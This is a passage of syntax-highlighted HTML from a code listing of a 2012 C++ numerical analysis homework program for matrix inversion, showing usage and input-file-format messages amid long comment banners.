class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">//Implementation for the Main method</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">//</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#include \"StdAfx.h\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\"></span><br><span class=\"line\">inline double getRandDouble()&#123;</span><br><span class=\"line\">    return (double)rand() / (double)rand() * (double)((rand() &amp; 1 &lt;&lt; 1) - 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void defaultOutput()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## 411 Homework: Numerical Analysis                    ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## Brian Chen, Oct 20, 2012                            ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"Usage:\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"invert \\n\");</span><br><span class=\"line\">\t\tprintf(\"With no arguments, invert returns this usage statement.\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"invert &lt;filename&gt;\\n\");</span><br><span class=\"line\">\t\tprintf(\"Prints out two matrix inverses for the provided matrix.\\n\");</span><br><span class=\"line\">\t\tprintf(\" -- the first inverse is computed with simple inversion.\\n\");</span><br><span class=\"line\">\t\tprintf(\" -- the second is computed with partial pivoting\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"invert -format\\n\");</span><br><span class=\"line\">\t\tprintf(\"Describes the file format for the input file.\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\texit(0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void fileFormat()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## 411 Homework: Numerical Analysis                    ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## Brian Chen, Oct 20, 2012                            ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"File format for a 3rd order matrix (input):\\n\");</span><br><span class=\"line\">\t\tprintf(\" - numbers below are space deliminated.  no tabs.\\n\");</span><br><span class=\"line\">\t\tprintf(\" - There are three lines, each with 3 numbers.\\n\");</span><br><span class=\"line\">\t\tprintf(\" - They will be parsed as doubles.\\n\");</span><br><span class=\"line\">\t\tprintf(\" - Comment lines start with <span class=\"comment\">#.  Comment lines cannot.\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"   interrupt the 3 lines with the matrix, but can come.\\n\");</span><br><span class=\"line\">\t\tprintf(\"   before or after.\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"---- Matrix file below, not including this line ----\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\"># comment\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\"># comment\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"1.2 3.3 4.4\\n\");</span><br><span class=\"line\">\t\tprintf(\"1.112 2.24 0\\n\");</span><br><span class=\"line\">\t\tprintf(\"3.4 2.2 98.23452\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"---- Matrix file above, not including this line ----\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\texit(0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span 